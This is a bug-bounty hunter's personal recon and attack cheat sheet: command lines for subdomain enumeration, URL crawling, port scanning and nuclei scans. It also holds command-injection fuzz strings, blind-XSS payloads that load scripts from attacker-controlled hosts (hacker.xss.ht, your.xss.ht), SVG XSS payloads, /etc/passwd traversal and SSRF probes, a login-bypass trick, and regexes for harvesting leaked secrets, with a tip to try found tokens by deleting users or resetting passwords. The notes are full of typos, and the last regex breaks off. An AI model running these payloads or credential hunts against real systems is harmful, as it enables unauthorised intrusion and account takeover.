
Adversarial Thinking for Bug Hunters
     “Make software work in ways it wasn’t intended or expected.”
              Security Risk → CWE → CAPEC → Testing Pattern = Attack
              
         ASSET DISCOVERY WEBSITES
         http://www.crunchbase.com/
         https://tracxn.com/a/dashboard
         Whois data
         https://bgp.he.net/         Autonomous System Number (ASN) for Internet-routable IP  or  amass intel -org “<target>
         https://blog.projectdiscovery.io/asnmap/
         https://github.com/hakluke/hakrevdns
         Shodan
         https://securitytrails.com/
              
  tip by dana
  You got notified of a new in-scope live host 🤠 you visit it, and you come across this page... What's the first thing you try? 😎
  
  *** I’d recon the host. Check all ports and services. DNS enumeration. Cert analysis and check for additional subdomains via vhost discovery. Then I’d try to use the login form with admin:admin via BurpSuite to capture the full request/response and review all client side code. 
I’d try to cause a real error to get an idea of the tech stack in use, and use that to inform my wordlist choice so I could do a slow directory enumeration from a separate ephemeral IP in the background while I continue to try to figure out what this host does. 


understand the scope
if small, dont do subdomain analysis, move into appliction analysis 
#check for sharing authentication
complex issue    //login issues been overlooked 
sudo cp ~smartkelvin/go/bin/pdtm  /usr/local/bin  

  cool recon tip
  1 - Get the company IPs range X.X.X.X/24

2 - Run nmap -p 80,448,8080 IP/24 -oN file.txt 

3 - Use any IP extractor or API in case of automation or bash then save it on IPs.txt

4- run httpx -l IPs.txt -o final.txt

5 - run nuclei -l final.txt

—————————————————-

oneliner to get subdomains and related from the target itself

for h in $(cat hosts.txt); do curl -siL https://$h|egrep -io  "[0-9a-z_\-\.]+\.([0-9a-z_\-]+)?`echo $h|awk -F '.' '{print $(NF-1)}'`([0-9a-z_\-\.]+)?\.[a-z]{1,5}"|sort -fu ; done

read file; amass enum -o subdomains.txt -d $file; cat subdomains.txt | while read url; do python3 http://cc.py "$url" -y 18; cat *.txt |sed 's/\//\n/g' | sort -u  | grep -v 'svg\|.png\|.img\|.ttf\|http:\|:\|.eot\|woff\|ico\|bootstrap\|.jpg\|.jpeg' > list.txt

tip
Command Injection:
~Find Your subdomains 
~cat subdomains.txt | httpx | gau | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt
~ ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
~search for ”uid” in burp proxy intercept 

  Quick Tip: To find Directory listing with zero efforts, Gather all the subdomains using all the techniques and then run httpx with above flags [-title -sc] and see if you get some title as “ Index of / “ or “ Index of “, etc.



 $ chmod +x (tool)
how to use files everywhere
# mv (tool) /usr/local/bin
                                                   
   breif summary of my recon
   nmap
  find subdomain
  sort
  parameter
  hidden parameter
  js files 
  dorking google and github
  one linners
  source code look
  old bug resolved



                my recon section
         place all the target in burpdsite  
                                 1
               subdomain enumeration
               amass, subfinder, assetfinder and sublister, findomain
               
               amass
               nano $HOME/.config/amass/config.yaml            add your api keys on this file
               amass enum -active -df domains.txt -config $HOME/.config/amass/config.yaml -o amass_subdoamins.txt
           amass intel -org "Tesla"         maybe for large scope and compaines
                   amass intel -active -asn 394161
          amass enum -asn -d tesla.com
          amass enum [-active] [-ip] -d target
           amass enum -d tesla.com | grep target
        amass enum -d target.com -o /filepath/subdomains.txt
          amass enum [-active] [-ip] -d target.com
           amass enum -d target.com | grep target.com  # To just list subdomains
           
                          assetfinder 
                        cat domains | assetfinder -subs-only
               
               subfinder 
               ~/.config/subfinder/provider-config.yaml     add  your api keys
               subfinder -d target.com -silent | httpx -silent -o urls.txt
                subfinder -d url - active | tee -a subfinder.txt
                subfinder -d google.com -all > subdomain.txt
                Discover subdomains, identify JavaScript files (with HTTP response status 200), and save the results in separate files
                subfinder -d target.com | httpx -mc 200 | tee subdomains.txt && cat subdomains.txt | waybackurls | httpx -mc 200 | grep .js | tee js.txt
                
                
                If you have domains.txt file now you wanna check for admin panel the file
                 subfinder -d target[.]com -silent | sed 's/$/\/admin/' | httpx -title -status-code -content-length
                 Blind XSS In X-Forwarded-For Header
                 subfinder -d target.com | gau | bxss -payload '"><script src=https://hacker.xss.ht></script>' -header "X-Forwarded-For"	
                 
        
                cat js.txt | grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password ftp            password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret"
                
                sublist3r
                pyhton sublist3r -d url -b optional
                
                
               brute force subdomain
               knock.py 
               
               dns for subdomain
               dnsgen
               echo "url" |dnsgen | tee -a dns.text
               
               maual subdomain enum
               virustotal, censys,  choas
               
               Search Subdomain using Gospider
               gospider -d 0 -s "https://site.com" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew
               
               NEW SUBDOMAINS FOR YOUR TARGET?
               curl -s --request GET --url https://api.securitytrails.com/v1/domain/target.com/subdomains?apikey=API_KEY | jq '.subdomains[]' | sed 's/\"//g' >test.txt 2>/dev/null && sed "s/$/.target.com/" test.txt | sed 's/ //g' && rm test.txt
               
                 2
                 cat subdomains.txt | sort -u >> uniq_subs.txt         remove all duplicates subdomain
                FILTERING OUT LIVE SUBDOMIN
                 httpx and httprobe
                 
                 # Check status of urls and make new file
                 
                  cat all_urls.txt | httpx -mc 200 | tee live_urls.txt   
                  cat | grep -E  (url ) | sort -u | tee -u | tee all_url.txt 
                 httpx -l subdomains.txt -ports 80,8080,8000,8888 -threads 200 > subdomains_alive.txt
                cat file.txt | httpx -sc
                cat uniq_subs.txt | httpx -o httpx
  
 
  
                  Httprobe 
            certspotter corp.yahoo.com | httprobe
            httprobe $ cat output.txt | httprobe | tee -a domains
             sort subdomain
             sort -u subdomains.txt | httprobe > /filepath/uniq.txt  
                 
                 
                 cat |grep -E *(url) | sot - u | urlsubdomain.txt
                  //note, when give a subdomian that is in scope , you have to move stright to extraction of url
                  
                  
                  /// cat subtxt sub2.txt sub3.txt | sort -u //
                  
                  
            3
               check for contetnt discovery
               dirb, gobuster,ffuf
               dirb https://example.com
               dirsearch -u https://example.com
               ffuf -u 'https://example.com' -H 'Host: FUZZ.example.com' -w Seclists/Discovery/DNS/top-1million-11.txt
               ffuf -u 'https://example.com' -H 'Host: FUZZ.example.com' -w Seclists/Discovery/DNS/top-1million-11.txt -fs 4517          //filter
               ffuf -u https://www.example.com/FUZZ -w wordlist/Seclists/Discovery/Web-content/raft-medium-files.txt -mc 200,302,301 -t 1000
               

               
                          4 
                 finding parameters, 
                 arjun , paramspider ,gf  check github
                 
                 paramspider -l domains.txt       check its saving of fills  
                 
        
                 
                 arjun -u https://www.example.com/file.php 
                 paramspider -l domains.txt -s
                 gospider -S domains.txt -o gospider
                
                 
                 5
                 URL RECON - EXTRACTION  and find sensitive files 
                 gau, gospider, katana, gauplus
                 
               
                 
                      katana     check my katana docs down
                 $ cat in_scope.txt        
                login/
                 admin/
                 app/
                wordpress/
                 katana -u https://tesla.com -cs in_scope.txt
                 
                 gau
                 echo "url" |gau | tee gau.txt
                 
                 cat gau.txt | unfurl keys | sort -u | grep -vE '_|/|\?|\\'
                 cat gau.txt | grep -E '\.pdf' | sort -u | httpx -mc 200 | tee .gauPdf.txt        you could change the pdf to any file like xls,doc
                gau  -oP '^https?://(?:[^/]*/){2}' gau.txt | sort -u | httpx -mc 200 | tee gau.txt
                cat gau.txt | grep -Ei 'login|register|signup|signin|sign-in|sign-up|dashboard' | httpx -mc 200 > authendpoint.txt
                
                
                
               cat gau.txt | grep ? | tee param.txt     /// filter out url
  gau $mytarget|egrep -iv '\.json'|grep -iE '\.js'|antiburl|awk '{print $4}' | xargs -I %% bash -c 'python3 SecretFinder.py -i %% -o cli -r "$anything"'
                  
                 gospider    check for goSpider github
                    
               Gospider -s (url) --subs --js || tee gospider.txt
               gospider -S domains.txt -o gospider
               
               SINGLE TARGET
               gospider -s "https://www.target.com/" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt
               
               MUITIPLE TARGET 
               gospider -S urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt
               
               GOSPIDER XSS
               gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
               gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
               
               
              fillter files fron it
             cat url.txt | awk "{print& 3}" | grep -E https:// | tee url.filter.txt
                 cat gspider.txt |awk '[print$]' | grep -E url | tee gospider.txt
                 
                 katana -list urls.txt -v -jc -o katana
                 katana -u http://testphp.vulnweb.com -js-crawl -d 5 -hl -filed endpoint | anew endpoint.txt
                 
                    # Search for testing point with gau and fff
                  gau target -subs | cut -d"?" -f1 | grep -E "\.js+(?:on|)$" | tee urls.txt
                 sort -u urls.txt | fff -s 200 -o out/

                 
                 
                 
                     JAVASCRIPTS FILES
                      
               
                 
                   
               cat gau.txt | grep ? | tee param.txt     /// filter out url
                  
              cat param.txt | grep -E '\.js$' | tee javascript.txt  filter out javascript
               echo TARGET.com | gau | grep ".js" | httpx -content-type | grep 'application/javascript' | awk '{print $1}' | nuclei -t /root/nuclei-templates/exposures/ -silent > secrets.txt
               
                   search javascript file
                 gau -subs DOMAIN |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> js.txt
                  
                   PART (1)
                 curl -L -k -s https://www.example.com | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | awk -F '//' '{if(length($2))print "https://"$2}' | sort -fu | xargs -I '%' sh -c "curl -k -s \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\"" | awk -F "['\"]" '{print $2}' | sort -fu
                 PART 2
                 curl -Lks https://example.com | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | sed -r "s/^src['\"]?[=:]['\"]//g" | awk -v url=https://example.com '{if(length($1)) if($1 ~/^http/) print $1; else if($1 ~/^\/\//) print "https:"$1; else print url"/"$1}' | sort -fu | xargs -I '%' sh -c "echo \"\n##### %\";wget --no-check-certificate --quiet \"%\"; basename \"%\" | xargs -I \"#\" sh -c 'linkfinder.py -o cli -i #'"
                 
                 part 3
                 curl -Lks https://example.com | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | sed -r "s/^src['\"]?[=:]['\"]//g" | awk -v url=https://example.com '{if(length($1)) if($1 ~/^http/) print $1; else if($1 ~/^\/\//) print "https:"$1; else print url"/"$1}' | sort -fu | xargs -I '%' sh -c "echo \"\n##### %\";wget --no-check-certificate --quiet \"%\";curl -Lks \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"('#####.*)|(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\" | sort -fu" | tr -d "'\""
                  part 4
                  curl -Lks https://example.com | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | sed -r "s/^src['\"]?[=:]['\"]//g" | awk -v url=https://example.com '{if(length($1)) if($1 ~/^http/) print $1; else if($1 ~/^\/\//) print "https:"$1; else print url"/"$1}' | sort -fu | xargs -I '%' sh -c "echo \"'##### %\";curl -k -s \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"('#####.*)|(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\" | sort -fu" | tr -d "'\""
                 
                 
                 
             
                 
                 
                 5
                 
                 find old url
                 find all vulnerabulities in old url
                 waybackurl, waybackmachine
                 echo "url"  | waybackurl
                 
                 5@   virtual host
               content discovery/params discovery  for bug hunting
                 
                 ffuf -w /wordlist/customlist/al.txt -c -u https://smart.com/FUZZ
                  waybackurls target.com | grep "\\.js"|uniq|sort
                 waybackurls target.com | grep "\\.js" | xargs -n1 -I@ curl -k @ | tee -a content.txt   
                 
                 
                 cat domains.txt | waybackurls > urls.txt    
                 
                 for xss
        waybackurls testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee Possible_xss.txt && cat Possible_xss.txt | output.txt
                   
                    echo "test.url" | waybackurls | grep "=" | tee waybackurls.txt
                    
                    
                    6
                     SORTING OUT URL 
                    gf,
              
                   cat | gf redirect | tee redirect.txt 
                   
                   
                   # Search for testing point with gau and fff
                   gau target -subs | cut -d"?" -f1 | grep -E "\.js+(?:on|)$" | tee urls.txt
                     sort -u urls.txt | fff -s 200 -o out/

                 If you are using gau to fetch some archive data, make sure to exclude a lot of extensions with --blacklist flag:
               cat t | gau --subs --blacklist png,jpg,jpeg,gif,mp3,mp4,svg,woff,woff2,etf,eof,otf,css,exe,ttf,eot



               AUTOMATIC REPLACE WITH PAYLOAD
               qsreplace .. check github
               
            

               
               10
               visual recon
                 eyewitness --web -f uniq.txt -d /path_to_save_screenshots  
                    
                 aquatone 
                 cat targets.txt | aquatone
                 $ cat hosts.txt | aquatone -ports 80,443,3000,3001
               
               11
               google dorking
               12
               github doeking
               https://www.lopseg.com.br/dork-helper#accessedLinks
               https://github.com/gwen001/github-subdomains
               
               13
               shodan dorking
               
               14
               
      Javascript Enumeration 
        arjun
      paramspider
      katana            katana -list {domains.txt} -d 5 -jc | grep ".js$"  | uniq | sort
      hawkrawler
      gosipder
      
      cat targets.txt | hakrawler -d 5 -dr -insecure -t 10 -timeout 360 | tee hakrawler.txt
      cat targets.txt | gospider -S - -q -d 5 -c 10 --sitemap --no-redirect -o gospider.txt
      
      #!/bin/bash

hakrawler -url "${1}" -plain -usewayback -wayback | grep "${1}" | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | dalfox pipe -b http://your.xss.ht
      
           
          tip
          echo "http://target.com" > target.txt
cat traget.txt| grep ".js$" | uniq | jsleak -l -s
cat traget.txt| grep ".js$" | uniq | jsecret
           
          tip  tip
             EASIEST-WAY-TO-FIND-HIDDEN-API-FROM-JS-FILES
      subfinder -d indeed.com -v -o subdomains.txt
      cat subdomains.txt | waybackurls > waybackurls.txt
      cat subdomains.txt | gau > gau.txt
      waymore -i subdomains.txt -mode U > waymore.txt
       Now will collect all urls into a single file naming as allurls
        we will use extensor to find the endpoint file
                 enter the file path :    home/the/filepath/
                 enter the file extension  :  js
                 enter the file name to save the url:  smart.txt
      now we use SecretFinder to find apikeys from js file       
       cat js.txt  | while read url; do python3 /home/kali/tools/SecretFinder/SecretFinder.py  -i $url -o cli; done   
          It will shows all the possible credentials in js file , when you find it just report and enjoy the bounty
          
                  tip
                  katana -list {domains.txt} -d 5 -jc | grep ".js$"  | uniq | sort
                  Download SecretFinder (GitHub)
                  cat {jsfilesgottenfromkatana.txt} | while read url; do python3 SecretFinder/SecretFinder.py  -i $url -o cli; done
                  If anything sensitive found report it.
         
                  
                  tip
                  Subfinder -d Host.com | tee Domains.txt
                  httpx -l Domains.txt | tee Live_Hosts.txt
                  katana -u Live_Hosts.txt | grep ".js$" | tee Js_urls.txt
                  cat Js_urls.txt | Mantra      check output to see if there is any api leak or token
                   curl -H "Authorization: apikey token=X" http://Host.com/users    
                   check if you can perform  API Calls using this token-> Add New User, Delete User ,Reset Any User Password
                   
                   
                     ***  tomnonnom***
                     gau example.net | unfurl -u paths
                     sed 's#/#\n#g' paths.txt | sort -u         Extract all the parts
                     gau example.net | unfurl -u keys
                     ffuf -w paths.txt -u https://example.net/FUZZ

          
      
  
      # Normal Install
      go install github.com/hakluke/hakrawler@latest
      https://github.com/GerbenJavado/LinkFinder

     # Single URL
      echo https://target.com | hakrawler

    # Multiple URLs
     cat urls.txt | hakrawler

     # Include subdomains
      echo https://target.com | hakrawler -subs

     # Get all subdomains of google, find the ones that respond to http(s), crawl them all
     echo target.com | haktrails subdomains | httpx | hakrawler
     #/bin/bash

hakrawler -url "${1}" -plain -usewayback -wayback | grep "${1}" | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | dalfox pipe -b https://your.xss.ht

# save to .sh, and run bash program.sh target.com
     
      using subjs
    $ cat urls.txt | subjs 
   $ subjs -i urls.txt
                
                15
     sensitive discovery in js files
     SecretFinder.py
      photon
   
               16
                SUBDOMAIN TAKEOVER
                https://github.com/Cyber-Guy1/Subdomainer
     Hostilesubruteforce
     ruby sub-brute.rb
     
     sub404
     python3 sub404.py  -f
     
     subjack
     
     bbot
    pipx install bbot
     bbot -t evilcorp.com -f subdomain-enum
     bbot -t evilcorp.com -f subdomain-enum -rf passive             //passive enum
     httpx -l subdomains.txt -o live_subdomains.txt
     
     
     methodology 
     checck for subdomian using amass, sublistr
       httpx -l subdomains.txt -o live_subdomains.txt       for live subdomian
       use nuclei template to identify
     nuclei -t <path>/nuclei-templates/takeovers/* -l all-live.txt
     
     
     
       
     GOOGLE DORK FOR SUBDOMAIN TAKEOVER  
     site:"*,example.com" intext:"PAGE NOT FOUND" | intext:"project not found" | intext:"repository not found" | intext:"domain does not exist" 
     | intext:"this page cound not be found" | intext:"404 Blog is not found" | intext:"domain name is invalid" | intext:"No settings were found for this company"
     cat domains.txt | assetfinder --subs-only | tee subdomains.txt; subjack -w subdomains.txt -ssl -t 100 | tee -a takeover.txt | grep -v "Vulnerable"
     
    
                 
      17
     using nuclie  and nuclie templete
     nuclei -u https://my.target.site    or   nuclei -l /path/to/list-of-targets.txt
     nuclei -u my.target.site:5759
     subfinder -d targetdomain.com -silent | httpx | nuclei -t technologies/tech-detect.yaml
     nuclei -u https:// my.target.site -as      fingerprint website technology
     nuclei -u https://my.target.site -t file/logs/python-app-sql-exceptions.yaml -t exposures/files/pyproject-disclosure.yaml  
     user@kali:~/nuclei-templates$ nuclei -u https://my.target.site -t templates-35.txt
     nuclei -u https://my.target.site -t file/logs -t exposures/files -t cves/2021
      nuclei -u https://example.com -t ./cent-nuclei-templates -tags cve
      nuclei -l urls.txt -t ./cent-nuclei-templates -tags cve
       nuclei -u https://example.com -t nuclei-templates -tags cve
        nuclei -l urls.txt -t nuclei-templates -tags cve

     user@kali:~/nuclei-templates$ nuclei -u https://my.target.site -t template-categories.txt
     nuclei -u https://jira.targetdomain.site -s critical,high,medium,low,info                          Select Templates By Severity (-s)
     nuclei -l list-of-targets.txt -timeout 1                                                            when scanning many host
     nuclei -l list-of-targets.txt -retries 3
     nuclei -l targets-file.txt -resume /path/to/resume-file.cfg                                          resuming scan when temporary hut a scan
     nuclei -u https://api.target.site -tags php,apache -H “Cookie:sc_=BPGFJcNgMwfePZBeJqoC838j8Mv4”        when authicated 
     nuclei -l targets.txt -t my-template.yaml -p http://127.0.0.1:8080      proxy to burp
     
     check this two .. most use
     nuclei -o output.txt -bs <> -c <> -rl <>
     katana -u http://testphp.vulnweb.com --silent | nuclei -u - -t sqli_blind_sleep.yaml
 
        
     
     18
     ADMIN LOGIN ONLINER
     cat domains_list.txt | httpx -ports 80,443,8080,8443 -path /admin -mr "admin"
     
     
     CHECK FOR RCE
     amass enum -active -d $1 -brute -w ~/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -o amass.txt
   cat amass.txt | aquatone -ports xlarge -out aqua_$1
   nuclei -l aqua_$1/aquatone_urls.txt -t ~/nuclei-templates -es info -o nuclei_$1.txt
     403 login Bypass
   cat hosts.txt | httpx -path /login -p 80,443,8080,8443 -mc 401,403 -silent -t 300 | unfurl format %s://%d | httpx -path //login -mc 200 -t 300 -nc -silent
    git-dumper http://example.com/.git/ output
     
     
     recon takeway tip     recon takeway tip        recon takeway tip       recon takeway tip
    Certificate Search
   using crt
   curl -s "https://crt.sh/?O=Apple%20Inc.&output=json" | jq -r ".[].common_name" | tr A-Z a-z | unfurl format %r.%t | sort -u | tee apple.cert.txt
   
   Leveraging IP to Asset Discovery
   http://ipip.net/    
   Using CSP Headers
     OSINT
     subfinder -silent -dL domains.txt | anew subs.txt
      while true; do subfinder -dL domains.txt -all | anew subs.txt | httpx | nuclei -t nuclei-templates/ | notify ; sleep 3600; don
     
     easy tip on bug bounty
     search for app for technology       wappalyer
     Shodan:  Search Query  for technology: Set-Cookie: CONCRETE5
    To Hunt for Specific Organisation
   Search Query: Set-Cookie: CONCRETE5 org:”Microsoft Corporation” 
   shodan cli ->  shodan search “Set-Cookie: CONCRETE5” — fields ip_str,port — separator “ “ | awk ‘{print $1”:”$2}’ | tee -a shodan-concrete-ips.txt
   Censys
    Search Query: 443.https.get.body:concrete5
    Writing Nuclei Template  of other vun
    
                               gauplus
                   cat domain.txt | gauplus -subs | grep -i "\.xlsx" allurls.txt | anew xlsx.txt
                    cat domain.txt | gauplus -subs | grep -i "\.sql" allurls.txt | anew sql.txt
                     cat domain.txt | gauplus -subs | grep -i "\.log" allurls.txt | anew log.txt
                      cat domain.txt | gauplus -subs | grep -i "\.bak" allurls.txt | anew bak.txt
                       cat domain.txt | gauplus -subs | grep "=" | Gxss -c 100 | anew reflected.txt
          cat domain.txt | gauplus -subs | grep "=" > url.txt; httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'
          
       cat domain.txt | gauplus -subs | qsreplace "<intearcst-client domain>" | httpx     ssrf
        cat domain.txt | gauplus -subs | grep -i "\.js$" > jsfiles.txt; while read url; do python3 secretfinder.py -l "$url"; done<jsfiles.txt
          cat domain.txt | gauplus -subs | httpx -sc -nc | grep "403\|401" | anew unauted.txt      check 403 bypass github
          
          cat domain.txt | gauplus -subs | httpx -title | grep -l "admin\|login\|dashboard" | anew loginpanel.txt   //add more keyword
          
          /SUBDOMAIN-FUZZING-WORTH-35K-
          ffuf -w /subdomain_megalist.txt -u 'https://adminFUZZ.Target.com' -c  -t 350 -mc all  -fs 0
          Using Burp Match And Replace or using Burp intercept response by

         change 302 Moved Temporarily to 200 OK
          remove Location: /admin/Login.aspx?logout=y
         remove html redirect code 
      ***   1_Always check the redirect response in burp
    ****  2_ If u found a bug in a subdomain and it fixed try Subdomain Fuzzing
              you can use it this way

     USING
        FUZZ-admin.target.com E.G: cert-admin.target.com
         adminFUZZ.target.com  E.G: admintest.target.com
          FUZZadmin.target.com  E.G  testadmin.target.com
          admin-FUZZ.target.com E.G: admin-stg.target.com
         admin.FUZZ.target.com E.G: admin.dev.target.com 
          
          

              KATANA
          katana -list url_list.txt
          echo “https://tesla.com” | katana
          katana -u https://tesla.com,https://google.com
          subfinder -d tesla.com -silent | httpx -silent | katana
          katana scan -u target.com --header "X-Requested-With: XMLHttpRequest" --header "Accept-Language: en-US,en;q=0.9
          katana -list urls.txt  -silent -d 6 -rl 25 -jc -f qurl | tee gapkatana.txt   
          katana scan -u target.com -p xss,sql
   note : Katana supports multiple default fields such as url, path, fqdn, rdn, rurl, qurl, qpath, file, key, value, kv, dir, udir     https://github.com/projectdiscovery/katana?ref=blog.projectdiscovery.io#-field
           katana -u https://yahoo.com -f qurl          
               (No need waybackurls)
     Example:
     echo target | katana -passive -f qurl -pss waybackarchive,commoncrawl, alienvault | tee endpoints
     
     katana” to list all endpoints matching  regex to fetch only those urls having parameters and values (? And =)
     katana -u https://redacted.com -fs dn -iqp -mr "\bhttps?:\/\/[^\s]+?\?[^\s]*=[^\s]*\b" -o katna.txt
                       
 whatweb -a 3 (url)
 ping -c 1 (ip)
fping -g (ip)/24  
nmap -PEPM -sP -n (ip)/24 


   PORT SCANNING 
   NMAP 
   nmap (url) -p80, 443 -F -A
   nmpa (url) --top -ports 2000
   nmap url -sV
   nmap url -sV --version -intensity 8
   nmap url -Sv --version - all
    
 check /usr/share/nmap    for SCRIPTS 
 
 nmap url --scripts =http-sql-injection
  nmap url --scripts =firewall-bypass -sw
nmap --scripts "discovery,ftp*,ssh*,http-vuln*,mysql-vuln*,imap-*,pop3-* -il ./nmap_input.txt
masscan -p1-65535 -il  ./dnsprobe_ip.txt -ol ./masscan_output.txt

     NAABU
    naabu -host url -p8080
    
    MAASSCAN
    masscan ip/24 p80, 443
    masscan ip/24 --top -ports
    

Dangerously fast dns/network/port scanner, all-in-one.        check it more  and also not  yet download
skanuvaty --target nmap.org --concurrency 16 --subdomains-file /usr/share/dnsenum/dns.txt       


 theHarvester -d  digitalpacific.com.au -b "anubis, baidu, bing, binaryedge, bingapi, bufferoverun, censys, certspotter, crtsh, dnsdumpster, duckduckgo, fullhunt, github-code, google, hackertarget, hunter, intelx, linkedin, linkedin_links, n45ht, omnisint, otx, pentesttools, projectdiscovery, qwant, rapiddns, rocketreach, securityTrails, spyse, sublist3r, threatcrowd, threatminer, trello, twitter, urlscan, virustotal, yahoo, zoomeye"
    
    
    CENsYS
    check for command line tools 
     check for api-key 
     python3 censys-subdomain.py (url)
     Look for SSL certificate:
    
    
    CHAOS  
    CHECK FOR github to get the api-key to run it
   

     
       
 check  ./cruze         //cruze : a script to automate all the lazy recon flow of the hunter with the tools great people have developed.
 ./cruze.sh example.com
 
 tips  
 LEAKED CREDENTIALS         https://github.com/h4x0r-dz/Leaked-Credentials/
 
 To search for leaked credentials using Google Chrome's Developer Tools and regex, follow these short steps:
Open DevTools: In Chrome, navigate to the site you're inspecting, then open Developer Tools with Ctrl+Shift+I (Windows/Linux) or Cmd+Option+I (macOS).
Go to Network Tab: Click on the "Network" tab.
Enable Regex Search: Click the regex icon in the filter bar to enable regex mode.
Refresh Page: Refresh the page to load all network requests.
Apply Regex: Paste the given regex into the filter bar to search for patterns indicating leaked credentials.
     
((access_key|access_token|admin_pass|admin_user|algolia_admin_key|algolia_api_key|alias_pass|alicloud_access_key|amazon_secret_access_key|amazonaws|ansible_vault_password|aos_key|api_key|api_key_secret|api_key_sid|api_secret|api.googlemaps AIza|apidocs|apikey|apiSecret|app_debug|app_id|app_key|app_log_level|app_secret|appkey|appkeysecret|application_key|appsecret|appspot|auth_token|authorizationToken|authsecret|aws_access|aws_access_key_id|aws_bucket|aws_key|aws_secret|aws_secret_key|aws_token|AWSSecretKey|b2_app_key|bashrc password|bintray_apikey|bintray_gpg_password|bintray_key|bintraykey|bluemix_api_key|bluemix_pass|browserstack_access_key|bucket_password|bucketeer_aws_access_key_id|bucketeer_aws_secret_access_key|built_branch_deploy_key|bx_password|cache_driver|cache_s3_secret_key|cattle_access_key|cattle_secret_key|certificate_password|ci_deploy_password|client_secret|client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key|cloudant_password|cloudflare_api_key|cloudflare_auth_key|cloudinary_api_secret|cloudinary_name|codecov_token|config|conn.login|connectionstring|consumer_key|consumer_secret|credentials|cypress_record_key|database_password|database_schema_test|datadog_api_key|datadog_app_key|db_password|db_server|db_username|dbpasswd|dbpassword|dbuser|deploy_password|digitalocean_ssh_key_body|digitalocean_ssh_key_ids|docker_hub_password|docker_key|docker_pass|docker_passwd|docker_password|dockerhub_password|dockerhubpassword|dot-files|dotfiles|droplet_travis_password|dynamoaccesskeyid|dynamosecretaccesskey|elastica_host|elastica_port|elasticsearch_password|encryption_key|encryption_password|env.heroku_api_key|env.sonatype_password|eureka.awssecretkey)[a-z0-9_ .\-,]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([0-9a-zA-Z\-_=]{8,64})['\"]

then Review Matches: Manually inspect the filtered requests to identify potential leaks.


USING BURP
 To search for leaked credentials in your target's scope using Burp Suite:

Launch Burp Suite: Start Burp Suite and configure your browser to route traffic through it.
Browse Your Target: Navigate through your target site and its subdomains to capture traffic in Burp Suite.
Use the Regex in Search:
Go to the "Burp" > "Search" tab.
In the search type, choose "Regular expression".
Paste the following regex:
  (?i)((access_key|access_token|admin_pass|admin_user|algolia_admin_key|algolia_api_key|alias_pass|alicloud_access_key|amazon_secret_access_key|amazonaws|ansible_vault_password|aos_key|api_key|api_key_secret|api_key_sid|api_secret|api.googlemaps AIza|apidocs|apikey|apiSecret|app_debug|app_id|app_key|app_log_level|app_secret|appkey|appkeysecret|application_key|appsecret|appspot|auth_token|authorizationToken|authsecret|aws_access|aws_access_key_id|aws_bucket|aws_key|aws_secret|aws_secret_key|aws_token|AWSSecretKey|b2_app_key|bashrc 